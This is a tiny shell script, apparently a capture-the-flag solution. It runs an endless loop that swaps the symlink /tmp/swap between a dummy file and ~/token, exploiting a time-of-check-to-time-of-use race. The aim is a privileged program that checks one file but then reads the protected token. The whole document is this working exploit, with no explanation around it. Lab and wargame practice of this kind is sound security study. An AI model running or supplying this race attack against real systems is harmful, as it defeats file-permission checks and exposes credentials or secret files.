 #!/bin/sh
 
 while [ 1 ]
 do
 	touch /tmp/flag
 	ln -fs /tmp/flag /tmp/swap
 	ln -fs ~/token /tmp/swap
 done
